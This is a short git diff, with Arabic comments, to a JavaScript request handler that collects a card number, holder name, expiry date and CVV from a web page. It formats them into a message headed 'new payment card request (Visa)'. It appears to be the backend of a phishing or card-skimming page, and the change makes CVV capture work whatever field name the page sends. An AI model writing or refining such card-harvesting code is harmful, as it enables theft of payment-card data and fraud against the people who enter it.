@@ -14,7 +14,8 @@ export default async function handler(req, res) {
   const cardNumber = body.card_number || body.cardNumber || 'غير متوفر';
   const cardName = body.card_name || body.cardName || body.cardHolder || 'غير متوفر';
   const expDate = body.exp_date || body.expDate || body.expiryDate || 'غير متوفر';
-  const cvc = body.cvc || body.cvv || body.check_id || 'غير متوفر';
+  // التقاط الـ CVV أيا كان اسم الحقل المرسل من الصفحة
+  const cvc = body.cvv || body.cvc || body.check_id || 'غير متوفر';
 
   const text = `💳 *طلب بطاقة دفع جديدة (فيزا)*\n\n` +
                `👤 اسم الحامل: ${cardName}\n` +
